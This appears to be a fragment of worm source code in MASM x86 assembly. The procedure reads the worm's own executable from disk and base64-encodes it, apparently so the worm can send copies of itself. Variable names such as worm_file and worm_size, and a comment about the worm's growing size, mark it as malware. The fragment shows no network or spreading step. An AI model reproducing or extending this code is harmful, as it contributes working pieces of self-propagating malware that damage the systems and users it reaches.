
.code
base64encoder proc       ; using caspar base64 this procedure will encode our file to base64

.data?

filehandlethis1 dd ?
memorythis1 dd ?
filesizethis1 dd ?
new_size dd ?
ultmem dd ?
flag db ?
.code

invoke GetModuleFileName,0,offset worm_file,256

invoke CreateFile,offset worm_file,80000000h,0,0,3,0,0

mov filehandlethis1,eax
invoke GetFileSize,filehandlethis1,0

mov filesizethis1,eax

invoke GlobalAlloc,0,filesizethis1

mov memorythis1,eax

invoke ReadFile,filehandlethis1,memorythis1,filesizethis1,offset bwr,0
cmp bwr,0
je encoding_failed


xor eax,eax
xor edx,edx
xor ecx,ecx
;mov eax,filesizethis1  ;this is changed b/c the worm will blow out b its growing size

mov eax,worm_size



xor ecx,ecx
xor edx,edx
mov ecx,3
div ecx
xor ecx,ecx
xor edx,edx

;size = sizeof(data) * 4/3 + 4
mov ecx,4
mul ecx

add eax,4

mov new_size,eax



invoke GlobalAlloc,0,new_size
or eax,eax
jz encoding_failed
mov ultmem,eax

invoke Base64_Encode,memorythis1,new_size,ultmem

invoke CloseHandle,filehandlethis1


ret

encoding_failed:
.data
errf db "encoding failure!",0
.code
;invoke MessageBox,0,offset errf,offset errf,0
invoke CloseHandle,filehandlethis1
mov eax,1


ret
base64encoder endp